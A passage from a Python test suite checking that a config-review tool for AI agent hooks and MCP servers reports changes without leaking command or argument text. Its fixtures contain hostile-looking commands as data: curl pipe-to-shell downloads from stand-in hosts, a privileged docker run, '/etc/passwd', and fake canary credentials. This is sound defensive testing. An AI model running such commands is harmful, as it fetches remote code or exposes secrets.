"""#819: a hook row names its matcher, command and timeout; an MCP row its launch arguments.

A hook row used to read `PostToolUse → PostToolUse` whether the edit was to the
matcher, the command or the timeout, and an MCP row could not show a version pin
moving to `@latest`, because the grants carried none of it: only `config_sha256`
saw the edit. Host-grants `0.7` publishes bounded detail on the hook and
`mcp_server` grants, and the shared capability rows render the difference.

No command or argument text is published (PM decision, 2026-09-23): four
review cycles each found a credential inside free-form shell text that a
redaction rule missed, so a hook command is published as its executable's
name and a digest of the whole command, and an MCP server's arguments as a
package specification of a strict shape and a digest of the rest.

What is pinned here:

- the four shapes from the issue, on every text route (`diff`, `verify`, the PR
  comment, `check`) and in the JSON that publishes the presentation
  (`review.changes[].change` in `diff --json` and `verifier.json`), with every
  row value and the row count unchanged;
- that no command or argument text reaches any artifact — the inventory, a
  saved baseline, drift, `diff` text and JSON, `check`, `verify` and every
  file it writes, the PR comment — for every payload earlier review cycles
  found a leak in, and for plain argument words too;
- the executable-name and package-shape rules, and the digests, which move
  only when `config_sha256` does;
- that the detail is display only: grant equality and the inventory digests
  leave it out, so a `0.6` baseline compares as it did and may be re-saved,
  and a saved baseline holds none of it;
- a reorder never claims the handlers are the same, and long entries never
  push a line `1.1.0` kept out of the PR comment: a row, the coverage block,
  the review question, the reproduction or the advisory;
- that plugin-selected and Codex hooks keep their loading basis, and a
  declaration outside the documented shape names the limit instead of a guess.
"""

from __future__ import annotations

import hashlib
import json
from collections import Counter
from pathlib import Path

import pytest
from jsonschema import Draft202012Validator

from agents_shipgate.core.capability_diff_rows import capability_diff_rows, review_changes
from agents_shipgate.core.host_grants import (
    DETAIL_NOT_SHOWN,
    DISPLAY_ONLY_GRANT_FIELDS,
    MAX_DETAIL_MATCHER_CHARS,
    MAX_DETAIL_MATCHER_INPUT_CHARS,
    MAX_DETAIL_WORD_CHARS,
    MAX_HOOK_HANDLERS,
    HostStaticParseCache,
    build_host_boundary_snapshot,
    build_host_drift_payload,
    build_host_grants_baseline,
    compared_grant,
    host_grants_sha256,
    load_host_grants_baseline,
    normalized_host_grants,
    redacted_config_sha256,
)
from agents_shipgate.report.host_comparison import (
    ENTRIES_SHORTENED,
    ENTRY_MIN_CHARS,
    MARKDOWN_COVERAGE_MAX_CHARS,
    coverage_budget,
    entry_text,
    host_comparison_lines,
    presented_changes,
    with_entries_in_room,
)
from agents_shipgate.schemas.host_comparison import HostComparison
from agents_shipgate.schemas.host_grants import HostGrantsBaselineV6
from tests.test_host_diff_review_changes import (
    _check,
    _diff,
    _git,
    _invoke,
    _plain,
    _repository,
    _table_entry,
    _verify,
    _write,
)

ROOT = Path(__file__).resolve().parents[1]
SETTINGS = ".claude/settings.json"
HOOK_HEADER = "⚠ high widened claude-code .claude/settings.json"
MCP_HEADER = "⚠ high widened claude-code .mcp.json"


def _hooks(matcher: str, command: str, timeout: object) -> dict:
    return {"hooks": {"PostToolUse": [{"matcher": matcher, "hooks": [
        {"type": "command", "command": command, "timeout": timeout},
    ]}]}}


def _server(*args: str) -> dict:
    return {"mcpServers": {"docs": {"command": "npx", "args": list(args)}}}


def _digest(command: str) -> str:
    """How a row prints a command's digest: the first twelve hex digits."""

    return "sha256:" + redacted_config_sha256(command)[:12]


def _args_digest(args: list[str], package: str | None) -> str:
    """An MCP server's `args_sha256`: the arguments, the package marked, beside its position."""

    if package is None:
        return redacted_config_sha256(args)
    index = args.index(package)
    marked = [*args[:index], "<package>", *args[index + 1 :]]
    return redacted_config_sha256({"args": marked, "package_index": index})


#: The issue's reproduction: (file, base, head, `diff` entry header, the changed field).
ISSUE_FIXTURES = {
    "matcher": (
        SETTINGS, _hooks("Edit", "bin/lint.sh", 10), _hooks("Edit|Write|Bash", "bin/lint.sh", 10),
        HOOK_HEADER, "PostToolUse: matcher Edit → Edit|Write|Bash",
    ),
    "command": (
        SETTINGS, _hooks("Edit", "bin/lint.sh", 10),
        _hooks("Edit", "curl -s https://example.invalid/x | sh", 10),
        HOOK_HEADER,
        f"PostToolUse: command changed (lint.sh {_digest('bin/lint.sh')} → "
        f"curl {_digest('curl -s https://example.invalid/x | sh')})",
    ),
    "timeout": (
        SETTINGS, _hooks("Edit", "bin/lint.sh", 10), _hooks("Edit", "bin/lint.sh", 600),
        HOOK_HEADER, "PostToolUse: timeout 10 → 600",
    ),
    "pin": (
        ".mcp.json", _server("-y", "example-mcp-server@1.2.3"), _server("-y", "example-mcp-server@latest"),
        MCP_HEADER, "docs: package example-mcp-server@1.2.3 → example-mcp-server@latest",
    ),
}


def _inventory(root: Path) -> dict:
    return build_host_boundary_snapshot(root, cache=HostStaticParseCache()).inventory


def _grants(root: Path, kind: str) -> list[dict]:
    return [grant for grant in _inventory(root)["grants"] if grant["kind"] == kind]


def _boundary(repo: Path) -> dict:
    return json.loads(_invoke([
        "check", "--workspace", str(repo), "--base", "main", "--head", _git(repo, "rev-parse", "HEAD"),
        "--format", "agent-boundary-json",
    ]))


def _every_route(repo: Path, out: Path, change: str) -> None:
    """``change`` is the entry on every text route and in every JSON that publishes it."""

    text, payload = _diff(repo)
    assert change in [" ".join(line.split()) for line in text.splitlines()]
    assert change in [entry["change"] for entry in payload["review"]["changes"]]
    block, summary, verifier = _verify(repo, out)
    assert f"  {change}" in block
    assert _plain(summary) == _plain(block)
    assert change in [entry["change"] for entry in verifier["host_comparison"]["review"]["changes"]]
    assert f"  {change}" in _check(repo)


# --- the issue's four shapes, on every route --------------------------------


@pytest.mark.parametrize("name", list(ISSUE_FIXTURES))
def test_each_changed_field_is_named_with_its_before_and_after_on_every_route(
    tmp_path: Path, name: str
) -> None:
    path, base, head, header, change = ISSUE_FIXTURES[name]
    repo = _repository(tmp_path, {path: base}, {path: head})
    subject_value = "docs" if name == "pin" else "PostToolUse"

    # `diff`: the text entry and the published presentation say the same thing.
    text, payload = _diff(repo)
    assert _table_entry(text, header)[1] == change
    [published] = payload["review"]["changes"]
    assert published["change"] == change
    # The row itself is what `1.1.0` published: one row, the same values.
    assert [(row["before"], row["after"], row["direction"]) for row in payload["rows"]] == [
        (subject_value, subject_value, "widened")
    ]

    # `verify`'s text, the PR comment and `verifier.json`.
    block, summary, verifier = _verify(repo, tmp_path / "out")
    assert block[2] == f"  {change}"
    assert _plain(summary) == _plain(block)
    assert verifier["host_comparison"]["review"]["changes"][0]["change"] == change
    assert [row["after"] for row in verifier["host_comparison"]["rows"]] == [subject_value]

    # `check`'s text reads the same rows; its boundary result carries rows alone.
    assert f"  {change}" in _check(repo)
    assert [(row["before"], row["after"]) for row in _boundary(repo)["rows"]] == [(subject_value, subject_value)]


def test_the_grants_publish_the_detail_the_rows_render(tmp_path: Path) -> None:
    root = tmp_path / "repo"
    _write(root, SETTINGS, _hooks("Edit|Write", "bin/lint.sh --fix", 30))
    _write(root, ".mcp.json", _server("-y", "example-mcp-server@1.2.3", "--port", "8080"))

    [hook] = _grants(root, "hook")
    assert hook["handlers"] == [{
        "matcher": "Edit|Write",
        "command": {"executable": "lint.sh", "sha256": redacted_config_sha256("bin/lint.sh --fix")},
        "timeout": 30,
    }]
    assert hook["omitted_handlers"] == 0
    # The digest is of the command as `config_sha256`'s input holds it: here,
    # with nothing to redact, the command's canonical JSON string.
    expected = hashlib.sha256(json.dumps("bin/lint.sh --fix").encode("utf-8")).hexdigest()
    assert hook["handlers"][0]["command"]["sha256"] == expected
    [server] = _grants(root, "mcp_server")
    assert server["package"] == "example-mcp-server@1.2.3"
    # Every other argument is digested, the package replaced by its marker and
    # its position digested beside them.
    assert server["args_sha256"] == redacted_config_sha256(
        {"args": ["-y", "<package>", "--port", "8080"], "package_index": 1}
    )
    assert "args" not in server and "omitted_args" not in server

    inventory = _inventory(root)
    baseline = build_host_grants_baseline(inventory)
    # A saved baseline holds the grants as comparisons read them.
    assert baseline["inventory"]["grants"] == [compared_grant(grant) for grant in inventory["grants"]]
    drift = build_host_drift_payload(baseline=baseline, inventory=inventory, baseline_file="b.json")
    for name, payload in (("inventory", inventory), ("baseline", baseline), ("drift", drift)):
        schema = json.loads((ROOT / f"docs/host-grants-{name}-schema.v0.7.json").read_text())
        Draft202012Validator(schema).validate(payload)


def test_an_added_and_a_removed_hook_name_their_handlers(tmp_path: Path) -> None:
    base = _hooks("Edit", "bin/lint.sh", 10)
    head = {"hooks": {
        "SessionEnd": [{"hooks": [{"type": "command", "command": "bin/cleanup.sh"}]}],
    }}
    repo = _repository(tmp_path, {SETTINGS: base}, {SETTINGS: head})

    text, payload = _diff(repo)
    assert _table_entry(text, "⚠ high added claude-code .claude/settings.json")[1] == (
        f"SessionEnd (command cleanup.sh {_digest('bin/cleanup.sh')})"
    )
    assert _table_entry(text, "high removed claude-code .claude/settings.json")[1] == (
        f"PostToolUse (matcher Edit; command lint.sh {_digest('bin/lint.sh')}; timeout 10) → gone"
    )
    assert sorted((row["before"], row["after"]) for row in payload["rows"]) == [
        ("PostToolUse", "—"), ("—", "SessionEnd"),
    ]


def _pre_tool_use(*handlers: dict) -> dict:
    return {"hooks": {"PreToolUse": [{"matcher": "Bash", "hooks": list(handlers)}]}}


def test_several_handlers_name_which_one_changed(tmp_path: Path) -> None:
    def hooks(timeout: int) -> dict:
        return {"hooks": {"PreToolUse": [
            {"matcher": "Bash", "hooks": [{"type": "command", "command": "bin/guard.sh"}]},
            {"matcher": "Edit", "hooks": [{"type": "command", "command": "bin/fmt.sh", "timeout": timeout}]},
        ]}}

    added = {"hooks": {"PreToolUse": [
        *hooks(5)["hooks"]["PreToolUse"],
        {"matcher": "Write", "hooks": [{"type": "command", "command": "bin/scan.sh"}]},
    ]}}
    for name, head, change in (
        ("timeout", hooks(50), "PreToolUse: handler 2 timeout 5 → 50"),
        ("added", added, f"PreToolUse: +handler (matcher Write, command scan.sh {_digest('bin/scan.sh')})"),
    ):
        (tmp_path / name).mkdir()
        repo = _repository(tmp_path / name, {SETTINGS: hooks(5)}, {SETTINGS: head})
        text, _ = _diff(repo)
        assert _table_entry(text, HOOK_HEADER)[1] == change, name


#: What a reorder says: equal published handlers never establish equal
#: handlers, since a setting such as `async` is not published (#819 review,
#: cycle 4).
REORDERED = (
    "PreToolUse: the published handlers in a different order; a detail this output does not "
    "show may also differ, such as another hook setting or a redacted or shortened matcher or "
    "timeout"
)


def test_a_reorder_says_a_detail_it_does_not_show_may_also_differ_on_every_route(tmp_path: Path) -> None:
    """`bin/a.sh`, `bin/lint.sh` (`async: false`) → `bin/lint.sh` (`async: true`), `bin/a.sh` (#819 review, cycle 4).

    Every route printed `the same handlers in a different order`, which the
    hidden `async` edit made false.
    """

    base = _pre_tool_use(
        {"type": "command", "command": "bin/a.sh"},
        {"type": "command", "command": "bin/lint.sh", "async": False},
    )
    head = _pre_tool_use(
        {"type": "command", "command": "bin/lint.sh", "async": True},
        {"type": "command", "command": "bin/a.sh"},
    )
    repo = _repository(tmp_path, {SETTINGS: base}, {SETTINGS: head})
    _every_route(repo, tmp_path / "out", REORDERED)
    assert "the same handlers" not in _diff(repo)[0]


def test_a_reorder_with_a_command_edit_past_the_old_word_bound_names_both_commands(tmp_path: Path) -> None:
    """The edit sat past the eighth word, so the published handlers matched as a set (#819 review, cycle 4).

    Every route printed `the same handlers in a different order`. The digest
    covers the whole command, so the edit is a command change.
    """

    safe, evil = "tool a b c d e f g h ./checks/safe.sh", "tool a b c d e f g h ./checks/evil.sh"
    base = _pre_tool_use({"type": "command", "command": safe}, {"type": "command", "command": "bin/lint.sh"})
    head = _pre_tool_use({"type": "command", "command": "bin/lint.sh"}, {"type": "command", "command": evil})
    repo = _repository(tmp_path, {SETTINGS: base}, {SETTINGS: head})
    change = (
        f"PreToolUse: handler 1 command changed (tool {_digest(safe)} → lint.sh {_digest('bin/lint.sh')}); "
        f"handler 2 command changed (lint.sh {_digest('bin/lint.sh')} → tool {_digest(evil)})"
    )
    _every_route(repo, tmp_path / "out", change)
    assert "different order" not in _diff(repo)[0]


def test_a_timeout_written_as_another_number_names_both(tmp_path: Path) -> None:
    """`5` and `5.0` are two published values, so the entry names them, not "no difference"."""

    repo = _repository(
        tmp_path, {SETTINGS: _hooks("Edit", "bin/lint.sh", 5)}, {SETTINGS: _hooks("Edit", "bin/lint.sh", 5.0)}
    )
    text, payload = _diff(repo)
    assert _table_entry(text, HOOK_HEADER)[1] == "PostToolUse: timeout 5 → 5.0"
    assert len(payload["rows"]) == 1


@pytest.mark.parametrize(
    ("base", "head", "change"),
    [
        (5, "5", 'PostToolUse: timeout 5 → "5"'),
        (5, "1e+100", 'PostToolUse: timeout 5 → "1e+100"'),
        (5, "5s", 'PostToolUse: timeout 5 → "5s"'),
        # A boolean or a non-finite number and the word a string spells for
        # it published alike and read "no difference" (#819 review, cycle 6).
        (True, "true", 'PostToolUse: timeout true → "true"'),
        (float("inf"), "inf", 'PostToolUse: timeout <not-shown> → "inf"'),
        (float("nan"), "nan", 'PostToolUse: timeout <not-shown> → "nan"'),
    ],
)
def test_a_timeout_written_as_text_is_quoted(tmp_path: Path, base: object, head: str, change: str) -> None:
    """`"timeout": 5` → `"5"` read `timeout 5 → 5` (#819 review, cycle 5), and `true` → `"true"` no difference (cycle 6)."""

    repo = _repository(
        tmp_path, {SETTINGS: _hooks("Edit", "bin/lint.sh", base)}, {SETTINGS: _hooks("Edit", "bin/lint.sh", head)}
    )
    [hook] = _grants(repo, "hook")
    assert hook["handlers"][0]["timeout"] == head
    _every_route(repo, tmp_path / "out", change)


#: A timeout of one followed by 400 zeros: an integer no float can hold, which
#: `math.isfinite` raised `OverflowError` on (#819 review, cycle 2). Its text
#: is 401 digits, more than the 309 of the largest float.
HUGE_TIMEOUT = 10**400


def test_an_over_long_timeout_integer_is_published_as_bounded_text_on_every_route(tmp_path: Path) -> None:
    """Every route that read the hook exited 1, and `verify` 4 with no PR comment or `verifier.json`."""

    head = json.dumps(_hooks("Edit", "bin/lint.sh", 10)).replace(": 10}", f": {HUGE_TIMEOUT}}}")
    assert str(HUGE_TIMEOUT) in head
    repo = _repository(tmp_path, {SETTINGS: _hooks("Edit", "bin/lint.sh", 10)}, {SETTINGS: head})
    shown = "1" + "0" * (MAX_DETAIL_WORD_CHARS - 2) + "…"
    change = f"PostToolUse: timeout 10 → {shown}"

    [hook] = _grants(repo, "hook")
    assert hook["handlers"][0]["timeout"] == shown
    inventory = json.loads(_invoke(["audit", "--host", "--workspace", str(repo), "--json"]))
    assert [grant["handlers"][0]["timeout"] for grant in inventory["grants"] if grant["kind"] == "hook"] == [shown]

    text, payload = _diff(repo)
    assert _table_entry(text, HOOK_HEADER)[1] == change
    assert [entry["change"] for entry in payload["review"]["changes"]] == [change]
    assert [(row["before"], row["after"]) for row in payload["rows"]] == [("PostToolUse", "PostToolUse")]
    block, summary, verifier = _verify(repo, tmp_path / "out")
    assert block[2] == f"  {change}"
    assert _plain(summary) == _plain(block)
    assert verifier["host_comparison"]["review"]["changes"][0]["change"] == change
    assert f"  {change}" in _check(repo)
    assert [(row["before"], row["after"]) for row in _boundary(repo)["rows"]] == [("PostToolUse", "PostToolUse")]


@pytest.mark.parametrize(
    ("timeout", "published"),
    [
        (30, 30),
        (-5, -5),
        (2.5, 2.5),
        (10 ** (MAX_DETAIL_WORD_CHARS - 1), 10 ** (MAX_DETAIL_WORD_CHARS - 1)),
        (10**MAX_DETAIL_WORD_CHARS, "1" + "0" * (MAX_DETAIL_WORD_CHARS - 2) + "…"),
        (-(10**MAX_DETAIL_WORD_CHARS), "-1" + "0" * (MAX_DETAIL_WORD_CHARS - 3) + "…"),
        (2**400, str(2**400)[: MAX_DETAIL_WORD_CHARS - 1] + "…"),
        (HUGE_TIMEOUT, "1" + "0" * (MAX_DETAIL_WORD_CHARS - 2) + "…"),
        # JSON has no spelling for these, and `inf` is a word a string may be.
        (float("inf"), DETAIL_NOT_SHOWN),
        (float("-inf"), DETAIL_NOT_SHOWN),
        (float("nan"), DETAIL_NOT_SHOWN),
        (True, True),
        (False, False),
        ("30s", "30s"),
        ("true", "true"),
        # Text that is not a plain token is not published.
        ("--token tokentimeout-canary", DETAIL_NOT_SHOWN),
        ("30 seconds", DETAIL_NOT_SHOWN),
        ([30], DETAIL_NOT_SHOWN),
        ({"seconds": 30}, DETAIL_NOT_SHOWN),
        (None, None),
    ],
)
def test_a_timeout_is_the_number_it_is_or_its_bounded_text(timeout: object, published: object) -> None:
    from agents_shipgate.core.host_grants import _hook_timeout

    shown = _hook_timeout(timeout)
    assert (shown, type(shown)) == (published, type(published))


def test_an_mcp_server_added_with_a_package_names_it(tmp_path: Path) -> None:
    repo = _repository(
        tmp_path,
        {".mcp.json": {"mcpServers": {}}},
        {".mcp.json": _server("-y", "example-mcp-server@2.0.0", "--root", "/srv/private-docs")},
    )
    text, _ = _diff(repo)
    assert _table_entry(text, "⚠ high added claude-code .mcp.json")[1] == (
        "docs (command name npx; package example-mcp-server@2.0.0)"
    )
    assert "private-docs" not in text


def test_an_argument_edit_names_the_digests_and_never_the_argument(tmp_path: Path) -> None:
    repo = _repository(
        tmp_path,
        {".mcp.json": _server("-y", "example-mcp-server@1.2.3", "--root", "/srv/public")},
        {".mcp.json": _server("-y", "example-mcp-server@1.2.3", "--root", "/srv/private-docs")},
    )
    [server] = _grants(repo, "mcp_server")
    base = _args_digest(["-y", "example-mcp-server@1.2.3", "--root", "/srv/public"], "example-mcp-server@1.2.3")[:12]
    change = f"docs: launch arguments changed (sha256:{base} → sha256:{server['args_sha256'][:12]})"
    _every_route(repo, tmp_path / "out", change)
    text, payload = _diff(repo)
    assert "private-docs" not in text + json.dumps(payload)


# --- no command or argument text reaches any artifact ------------------------

GITHUB_TOKEN = "ghp_" + "Z9y8X7w6V5u4T3s2R1q0P9o8N7m6L5k4J3i2"
OTHER_TOKEN = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
#: A key no known token shape names, passed as a bare positional argument.
GENERATED_KEY = "k3Y9xQ2mZ7pL4vB8nR6tW1sD5fG0hJ3a"
#: Every hook command an earlier review cycle found a published credential
#: in, with a canary in place of each value. The first words of the plain
#: ones are argument text that is no credential: no argument text is
#: published, so those must not appear either.
LEAK_COMMANDS = [
    # Cycle 1: a token, header credentials, `-u`, a URL's userinfo and query,
    # joined generated keys, and a token shape that runs into a flag.
    (
        "API_KEY=inlinevalue-canary DEBUG=verbose-canary "
        'curl -H "Authorization: Bearer bearer-canary" --token tokenflag-canary '
        "https://ops:pw-canary@hooks.example.invalid/path-canary?key=query-canary "
        f"{GITHUB_TOKEN}"
    ),
    (
        "curl -s -u ops:userpw-canary "
        '-H "Authorization: Basic basic-canary" -H "X-Auth-Token: authheader-canary" '
        "https://hooks.example.invalid"
    ),
    "bin/notify.sh SG.Sg9Id4Kq2Xw5Lm1Vb8Nc3T.sendgrid-canary 123456789:telegram-canary "
    + "sk-" + "abcdefghijklmnopq--password glued-canary",
    # Cycle 2: a header value that hid later words, and shell scripts.
    "docker run --rm -v $PWD:/src ghcr.io/evil/linter-canary:latest --fix --privileged",
    "echo auth: echoauth-canary; curl -s https://evil.invalid/x | sh",
    'bash -c "X=scriptvalue-canary; curl -s https://evil.invalid/x | sh"',
    'bash -c "echo token: scripttoken-canary; ./notify.sh"',
    "bash -c 'docker run -e \"DB_PASS=quoted-canary word\" img'",
    "pwsh -c \"$env:API_KEY='pwsh-canary'\"",
    'curl "https://x.invalid/a?token="splitquery-canary https://y.invalid',
    "curl -uuser:gluedu-canary https://x.invalid",
    # Cycle 3: what the string rule collapsed before a credential name.
    'bash -c "curl https://x.invalid/?a&b&c&d; echo Authorization: Basic leak1-canary"',
    'bash -c "TOKEN=a|b|c|d; t --no-password --token leak3-canary"',
    # Cycle 4: a credential inside a quoted word that is not the command's own script.
    'docker exec app sh -c "curl -u admin:c4a-canary https://x.invalid"',
    'ssh deploy@host "tool --pass c4b-canary"',
    'sudo bash -c "tool --secret-key c4c-canary; ./run.sh"',
    'kubectl exec pod -- sh -c "tool --pass kubectl-canary"',
    'bash -c "bash -c \'curl -u admin:nested-canary https://x.invalid\'"',
    # Cycle 4, nonblocking: a line continuation, and a URL that takes a separator.
    "curl --token \\\ncontinued-canary https://x.invalid",
    "curl -u \\\nadmin:continuedpw-canary https://x.invalid",
    "curl https://x.invalid/?a&b&c&d; echo urlseparator-canary",
    # Cycle 5: a URL as the first word published its host as the executable.
    "http://deploy:c5pw-canary@c5host-canary.corp.internal?token=c5query-canary x",
    # Plain argument words, which no redaction rule would ever name.
    "bin/run.sh --mode plainword-canary --out ./plainpath-canary",
]
#: The same, as MCP server arguments.
LEAK_ARGS = {
    "api": [
        "-y", "api-mcp@2.0.0", "--api-key", "apikey-canary", "--access-token=access-canary",
        GENERATED_KEY, "-e", "DB_PASSWORD=envarg-canary", OTHER_TOKEN,
    ],
    "headers": [
        "--header", "Authorization: Basic basicarg-canary", "--header", "api-key: apikeyheader-canary",
        "serve", "token", "baretoken-canary", "--auth", "authflag-canary",
        "--brave_api_key", "underscore-canary",
    ],
    "tokens": [
        "AccountName=acct;AccountKey=azure-canary", "--no-password", "--token", "chained-canary",
        "--secret-key", "secretkey-canary", "--pass", "pass-canary", "-p", "shortpw-canary",
    ],
    "shell": ["-c", "curl https://x.invalid/?a&b&c&d; t --no-password --token leak2-canary"],
    "exec": ["exec", "app", "sh", "-c", "gh auth login token c4d-canary"],
    "plain": ["serve", "--dir", "/srv/plainarg-canary", "--label", "plainlabel-canary"],
    # A credential shaped like a package after a flag that is no runner's.
    "shaped": ["--pass", "hunter-canary@1.2.3", "--token", "tok-canary@1.2.3"],
}
#: What must never appear, whatever case an output writes it in.
SECRETS = ("canary", GITHUB_TOKEN.lower(), OTHER_TOKEN.lower(), GENERATED_KEY.lower())


def _leak_repo(tmp_path: Path) -> Path:
    events = [
        "PreToolUse", "PostToolUse", "Notification", "UserPromptSubmit", "Stop", "SubagentStop",
        "PreCompact", "SessionStart", "SessionEnd",
    ]
    groups: dict[str, list] = {event: [] for event in events}
    for index, command in enumerate(LEAK_COMMANDS):
        groups[events[index % len(events)]].append({"hooks": [{"type": "command", "command": command}]})
    servers = {name: {"command": "bash" if name == "shell" else "docker" if name == "exec" else "npx", "args": args}
               for name, args in LEAK_ARGS.items()}
    return _repository(
        tmp_path,
        {
            SETTINGS: _hooks("Edit", "bin/lint.sh", 10),
            ".mcp.json": {"mcpServers": {"api": {"command": "npx", "args": ["-y", "api-mcp@1.0.0"]}}},
        },
        {SETTINGS: {"hooks": groups}, ".mcp.json": {"mcpServers": servers}},
    )


def _assert_no_secret(outputs: list[str]) -> None:
    for output in outputs:
        lowered = output.lower()
        for secret in SECRETS:
            assert secret not in lowered, (secret, output[max(0, lowered.find(secret) - 200):][:400])


def test_no_command_or_argument_text_reaches_any_output_or_artifact(tmp_path: Path) -> None:
    """Every payload of the earlier review cycles, on every route and in every file written.

    The inventory, a saved baseline, a drift payload, `diff` text and JSON,
    `check` text and its boundary JSON, `verify` text and every file it
    writes (the PR comment and `verifier.json` among them).
    """

    repo = _leak_repo(tmp_path)
    out = tmp_path / "out"
    text, payload = _diff(repo)
    block, summary, verifier = _verify(repo, out)
    check = _check(repo)
    boundary = json.dumps(_boundary(repo))
    inventory = _invoke(["audit", "--host", "--workspace", str(repo), "--json"])
    artifacts = [path.read_text(encoding="utf-8") for path in sorted(out.rglob("*")) if path.is_file()]
    assert any(path.name == "pr-comment.md" for path in out.rglob("*"))
    # A baseline saved at the base commit, and drift of the head against it:
    # the drift's current side carries the new detail.
    _git(repo, "checkout", "-q", "main")
    _invoke(["audit", "--host", "--workspace", str(repo), "--save-baseline"])
    _git(repo, "checkout", "-q", "change")
    drift = _invoke(["audit", "--host", "--workspace", str(repo), "--drift", "--json"])
    assert json.loads(drift)["changes"]
    _invoke(["audit", "--host", "--workspace", str(repo), "--save-baseline"])
    baseline = (repo / ".agents-shipgate/host-grants.json").read_text(encoding="utf-8")
    _assert_no_secret([
        text, json.dumps(payload), "\n".join(block), "\n".join(summary), json.dumps(verifier),
        "\n".join(check), boundary, inventory, drift, baseline, *artifacts,
    ])

    # What is published instead: an executable's name when it is a plain
    # token, a digest, and a package of the strict shape.
    hooks = [handler for grant in _grants(repo, "hook") for handler in grant["handlers"]]
    assert sorted({handler["command"]["executable"] for handler in hooks}) == sorted({
        DETAIL_NOT_SHOWN, "bash", "curl", "docker", "echo", "kubectl", "notify.sh", "pwsh", "run.sh",
        "ssh", "sudo",
    })
    assert all(len(handler["command"]["sha256"]) == 64 for handler in hooks)
    servers = {grant["server"]: grant for grant in _grants(repo, "mcp_server")}
    assert {name: grant["package"] for name, grant in servers.items()} == {
        "api": "api-mcp@2.0.0", "headers": None, "tokens": None, "shell": None, "exec": None,
        "plain": None, "shaped": None,
    }
    assert "launch arguments changed" in _table_entry(text, MCP_HEADER)[1]


def test_a_rotated_value_the_display_never_redacted_is_still_a_row(tmp_path: Path) -> None:
    """The digest sees what `config_sha256` sees: a positional token, `--secret-key`, a header's words after its scheme."""

    for name, before, after in (
        ("positional", f"bin/a.sh {GITHUB_TOKEN}", f"bin/a.sh {OTHER_TOKEN}"),
        ("secret-key", "bin/a.sh --secret-key first-canary", "bin/a.sh --secret-key second-canary"),
        ("scheme", 'curl -H "Authorization: Bearer first-canary"', 'curl -H "Authorization: Bearer second-canary"'),
    ):
        (tmp_path / name).mkdir()
        repo = _repository(tmp_path / name, {SETTINGS: _stop_hook(before)}, {SETTINGS: _stop_hook(after)})
        text, payload = _diff(repo)
        executable = "a.sh" if name != "scheme" else "curl"
        assert _table_entry(text, HOOK_HEADER)[1] == (
            f"Stop: command changed ({executable} {_digest(before)} → {executable} {_digest(after)})"
        ), name
        assert len(payload["rows"]) == 1
        _assert_no_secret([text, json.dumps(payload)])


def _stop_hook(command: str) -> dict:
    return {"hooks": {"Stop": [{"hooks": [{"type": "command", "command": command}]}]}}


#: Values `config_sha256`'s own input redacts, rotated: (file, base, head).
DIGEST_REDACTED_ROTATIONS = {
    "hook --token": (SETTINGS, _stop_hook("bin/a.sh --token first-canary"), _stop_hook("bin/a.sh --token second-canary")),
    "hook --api-key": (SETTINGS, _stop_hook("bin/a.sh --api-key first-canary"), _stop_hook("bin/a.sh --api-key second-canary")),
    "hook --password=": (SETTINGS, _stop_hook("bin/a.sh --password=first-canary"), _stop_hook("bin/a.sh --password=second-canary")),
    "hook X-Api-Key:": (
        SETTINGS,
        _stop_hook('curl -H "X-Api-Key: first-canary" https://example.invalid'),
        _stop_hook('curl -H "X-Api-Key: second-canary" https://example.invalid'),
    ),
    "mcp --token": (".mcp.json", _server("-y", "pkg", "--token", "first-canary"), _server("-y", "pkg", "--token", "second-canary")),
    "mcp --password": (".mcp.json", _server("--password", "first-canary"), _server("--password", "second-canary")),
    "mcp --no-password --token": (
        ".mcp.json",
        _server("--no-password", "--token", "first-canary"),
        _server("--no-password", "--token", "second-canary"),
    ),
}


@pytest.mark.parametrize("name", list(DIGEST_REDACTED_ROTATIONS))
def test_a_value_the_digest_already_redacts_stays_quiet_as_before(tmp_path: Path, name: str) -> None:
    """A value `config_sha256`'s input redacts moves no published digest, so it adds no row.

    What the documentation says of it: it is not compared, so a change
    confined to it is no row, as on 1.1.0.
    """

    path, base, head = DIGEST_REDACTED_ROTATIONS[name]
    repo = _repository(tmp_path, {path: base}, {path: head})
    text, payload = _diff(repo)
    assert payload["rows"] == []
    assert "canary" not in text


@pytest.mark.parametrize(
    ("command", "executable"),
    [
        ("bin/lint.sh --fix", "lint.sh"),
        ('"$CLAUDE_PROJECT_DIR"/.claude/hooks/lint.sh --fix', "lint.sh"),
        ('"$CLAUDE_PROJECT_DIR/.claude/hooks/lint.sh" --fix', "lint.sh"),
        ("/bin/sh ${CLAUDE_PROJECT_DIR:-.}/scripts/x.sh", "sh"),
        ("C:\\tools\\lint.exe --fix", "lint.exe"),
        ("npx -y prettier@3.0.0 --write", "npx"),
        ("python3.12 -m tool", "python3.12"),
        ("g++ -o out main.cc", "g++"),
        # A leading assignment, a quoted name with a blank, a URL, a token
        # shape, an operator or a substitution is never named.
        ("API_KEY=first-canary curl https://x.invalid", DETAIL_NOT_SHOWN),
        ("'my tool.sh' --fix", DETAIL_NOT_SHOWN),
        ("https://hooks.example.invalid/secret-path/run.sh", DETAIL_NOT_SHOWN),
        # A URL with no path published its host: the digest's input keeps a
        # URL's host and drops its userinfo, query and path (#819 review, cycle 5).
        ("https://evil.invalid", DETAIL_NOT_SHOWN),
        ("https://evil.invalid?token=abc", DETAIL_NOT_SHOWN),
        ("http://user:pw@secret-host.internal", DETAIL_NOT_SHOWN),
        ("http://deploy:hunter2@build-cache.corp.internal?token=abc123 x", DETAIL_NOT_SHOWN),
        ("'https://evil.invalid'", DETAIL_NOT_SHOWN),
        ("ftp://files.internal", DETAIL_NOT_SHOWN),
        ("file:///etc/passwd", DETAIL_NOT_SHOWN),
        (f"{GITHUB_TOKEN} run", DETAIL_NOT_SHOWN),
        ("$(cat /tmp/x) run", DETAIL_NOT_SHOWN),
        ("|| true", DETAIL_NOT_SHOWN),
        # A shell reserved word opens a compound command; it names no program.
        ('if [ -f x ]; then ./x; fi', DETAIL_NOT_SHOWN),
        ("for f in *.py; do ruff $f; done", DETAIL_NOT_SHOWN),
        ("time ./build.sh", DETAIL_NOT_SHOWN),
        ("x" * 81, DETAIL_NOT_SHOWN),
    ],
)
def test_the_executable_is_a_plain_token_or_not_named(command: str, executable: str) -> None:
    from agents_shipgate.core.host_grants import _hook_command

    assert _hook_command(command) == {"executable": executable, "sha256": redacted_config_sha256(command)}


@pytest.mark.parametrize(
    ("args", "package"),
    [
        (["-y", "example-mcp-server@1.2.3"], "example-mcp-server@1.2.3"),
        (["-y", "example-mcp-server@latest"], "example-mcp-server@latest"),
